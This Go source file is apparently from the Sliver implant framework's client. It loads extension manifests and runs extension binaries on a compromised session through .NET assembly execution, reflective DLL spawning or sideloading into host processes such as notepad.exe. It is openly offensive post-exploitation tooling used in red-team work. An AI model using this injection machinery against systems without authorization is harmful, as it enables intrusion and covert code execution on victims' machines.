package extensions

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"path"
	"path/filepath"
	"strings"

	"github.com/bishopfox/sliver/client/command/help"
	"github.com/bishopfox/sliver/client/console"
	consts "github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/desertbit/grumble"
)

const (
	defaultTimeout = 60

	windowsDefaultHostProc = `c:\windows\system32\notepad.exe`
	linuxDefaultHostProc   = "/bin/bash"
	macosDefaultHostProc   = "/Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment"
)

var commandMap map[string]extension
var defaultHostProc = map[string]string{
	"windows": windowsDefaultHostProc,
	"linux":   windowsDefaultHostProc,
	"darwin":  macosDefaultHostProc,
}

type binFiles struct {
	Ext64Path string `json:"x64"`
	Ext32Path string `json:"x86"`
}

type extFile struct {
	OS    string   `json:"os"`
	Files binFiles `json:"files"`
}

type extensionCommand struct {
	Name           string    `json:"name"`
	Entrypoint     string    `json:"entrypoint"`
	Help           string    `json:"help"`
	LongHelp       string    `json:"longHelp"`
	AllowArgs      bool      `json:"allowArgs"`
	DefaultArgs    string    `json:"defaultArgs"`
	ExtensionFiles []extFile `json:"extFiles"`
	IsReflective   bool      `json:"isReflective"`
	IsAssembly     bool      `json:"IsAssembly"`
}

func (ec *extensionCommand) getDefaultProcess(targetOS string) (proc string, err error) {
	proc, ok := defaultHostProc[targetOS]
	if !ok {
		err = fmt.Errorf("no default process for %s target, please specify one", targetOS)
	}
	return
}

type extension struct {
	Name     string             `json:"extensionName"`
	Commands []extensionCommand `json:"extensionCommands"`
	Path     string
}

func (e *extension) getFileForTarget(cmdName string, targetOS string, targetArch string) (filePath string, err error) {
	for _, c := range e.Commands {
		if cmdName == c.Name {
			for _, ef := range c.ExtensionFiles {
				if targetOS == ef.OS {
					switch targetArch {
					case "x86":
						filePath = fmt.Sprintf("%s/%s", e.Path, ef.Files.Ext32Path)
					case "x64":
						filePath = fmt.Sprintf("%s/%s", e.Path, ef.Files.Ext64Path)
					default:
						filePath = fmt.Sprintf("%s/%s", e.Path, ef.Files.Ext64Path)
					}
				}
			}

		}
	}
	if filePath == "" {
		err = fmt.Errorf("no extension file found for %s/%s", targetOS, targetArch)
	}
	return
}

func (e *extension) getCommandFromName(name string) (extCmd *extensionCommand, err error) {
	for _, x := range e.Commands {
		if x.Name == name {
			extCmd = &x
			return
		}
	}
	err = fmt.Errorf("no extension command found for name %s", name)
	return
}

// LoadExtensionCmd - Locally load an extension into the Sliver shell.
func LoadExtensionCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {

	dirPath := ctx.Args.String("dir-path")
	if dirPath == "" {
		con.PrintErrorf("Please provide an extension path\n")
		return
	}

	// retrieve extension manifest
	manifestPath := fmt.Sprintf("%s/%s", dirPath, "manifest.json")
	jsonBytes, err := ioutil.ReadFile(manifestPath)
	if err != nil {
		con.PrintErrorf("%s\n", err)
	}
	// parse it
	ext := &extension{}
	err = json.Unmarshal(jsonBytes, ext)
	if err != nil {
		con.PrintErrorf("Error loading extension: %v", err)
		return
	}
	ext.Path = dirPath
	// for each extension command, add a new app command
	for _, extCmd := range ext.Commands {
		// do not add if the command already exists
		if cmdExists(extCmd.Name, ctx.App) {
			con.PrintErrorf("%s command already exists\n", extCmd.Name)
			return
		}
		con.PrintInfof("Adding %s command: %s\n", extCmd.Name, extCmd.Help)

		// Have to use a global map here, as passing the extCmd
		// either by value or by ref fucks things up
		commandMap[extCmd.Name] = *ext
		helpMsg := fmt.Sprintf("[%s] %s", ext.Name, extCmd.Help)
		extensionCmd := &grumble.Command{
			Name:     extCmd.Name,
			Help:     helpMsg,
			LongHelp: help.FormatHelpTmpl(extCmd.LongHelp),
			Run: func(extCtx *grumble.Context) error {
				con.Println()
				runExtensionCommand(extCtx, con)
				con.Println()
				return nil
			},
			Flags: func(f *grumble.Flags) {
				if extCmd.IsAssembly {
					f.String("m", "method", "", "Optional method (a method is required for a .NET DLL)")
					f.String("c", "class", "", "Optional class name (required for .NET DLL)")
					f.String("d", "app-domain", "", "AppDomain name to create for .NET assembly. Generated randomly if not set.")
					f.String("a", "arch", "x84", "Assembly target architecture: x86, x64, x84 (x86+x64)")
				}
				f.String("p", "process", "", "Path to process to host the shared object")
				f.Bool("s", "save", false, "Save output to disk")
				f.Int("t", "timeout", defaultTimeout, "command timeout in seconds")
			},
			Args: func(a *grumble.Args) {
				a.StringList("arguments", "arguments", grumble.Default([]string{}))
			},
			HelpGroup: consts.ExtensionHelpGroup,
		}
		con.App.AddCommand(extensionCmd)
	}
	con.PrintInfof("%s extension has been loaded\n", ext.Name)
}

func runExtensionCommand(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session := con.ActiveSession.GetInteractive()
	if session == nil {
		return
	}
	ext, ok := commandMap[ctx.Command.Name]
	if !ok {
		con.PrintErrorf("No extension command found for `%s` command\n", ctx.Command.Name)
		return
	}

	binPath, err := ext.getFileForTarget(ctx.Command.Name, session.GetOS(), session.GetArch())
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	c, err := ext.getCommandFromName(ctx.Command.Name)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	args := ctx.Args.StringList("arguments")
	var extArgs string
	if len(c.DefaultArgs) != 0 && len(args) == 0 {
		extArgs = c.DefaultArgs
	} else {
		extArgs = strings.Join(args, " ")
	}
	entryPoint := c.Entrypoint
	processName := ctx.Flags.String("process")
	if processName == "" {
		processName, err = c.getDefaultProcess(session.GetOS())
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
	}
	isDLL := false
	if filepath.Ext(binPath) == ".dll" {
		isDLL = true
	}
	binData, err := ioutil.ReadFile(binPath)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	var outFilePath *os.File
	if ctx.Flags.Bool("save") {
		outFile := path.Base(fmt.Sprintf("%s_%s*.log", ctx.Command.Name, session.GetHostname()))
		outFilePath, err = ioutil.TempFile("", outFile)
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
	}
	if c.IsAssembly {
		ctrl := make(chan bool)
		msg := fmt.Sprintf("Executing %s %s ...", ctx.Command.Name, extArgs)
		con.SpinUntil(msg, ctrl)
		executeAssemblyResp, err := con.Rpc.ExecuteAssembly(context.Background(), &sliverpb.ExecuteAssemblyReq{
			Request:   con.ActiveSession.Request(ctx),
			IsDLL:     isDLL,
			Process:   processName,
			Arguments: extArgs,
			Assembly:  binData,
			Arch:      ctx.Flags.String("arch"),
			Method:    ctx.Flags.String("method"),
			ClassName: ctx.Flags.String("class"),
			AppDomain: ctx.Flags.String("app-domain"),
		})
		ctrl <- true
		<-ctrl
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
		con.PrintInfof("Output:\n%s", string(executeAssemblyResp.GetOutput()))
		if outFilePath != nil {
			outFilePath.Write(executeAssemblyResp.GetOutput())
			con.PrintInfof("Output saved to %s\n", outFilePath.Name())
		}
	} else if c.IsReflective {
		ctrl := make(chan bool)
		msg := fmt.Sprintf("Executing %s %s ...", ctx.Command.Name, extArgs)
		con.SpinUntil(msg, ctrl)
		spawnDllResp, err := con.Rpc.SpawnDll(context.Background(), &sliverpb.InvokeSpawnDllReq{
			Request:     con.ActiveSession.Request(ctx),
			Args:        strings.Trim(extArgs, " "),
			Data:        binData,
			ProcessName: processName,
			EntryPoint:  c.Entrypoint,
			Kill:        true,
		})
		ctrl <- true
		<-ctrl

		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}

		con.PrintInfof("Output:\n%s", spawnDllResp.GetResult())
		if outFilePath != nil {
			outFilePath.Write([]byte(spawnDllResp.GetResult()))
			con.PrintInfof("Output saved to %s\n", outFilePath.Name())
		}
	} else {
		ctrl := make(chan bool)
		msg := fmt.Sprintf("Executing %s %s ...", ctx.Command.Name, extArgs)
		con.SpinUntil(msg, ctrl)
		sideloadResp, err := con.Rpc.Sideload(context.Background(), &sliverpb.SideloadReq{
			Request:     con.ActiveSession.Request(ctx),
			Args:        extArgs,
			Data:        binData,
			EntryPoint:  entryPoint,
			ProcessName: processName,
			Kill:        true,
			IsDLL:       isDLL,
		})
		ctrl <- true
		<-ctrl

		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}

		con.PrintInfof("Output:\n%s", sideloadResp.GetResult())
		if outFilePath != nil {
			outFilePath.Write([]byte(sideloadResp.GetResult()))
			con.PrintInfof("Output saved to %s\n", outFilePath.Name())
		}
	}
}

func cmdExists(name string, app *grumble.App) bool {
	for _, c := range app.Commands().All() {
		if name == c.Name {
			return true
		}
	}
	return false
}

func init() {
	commandMap = make(map[string]extension)
}
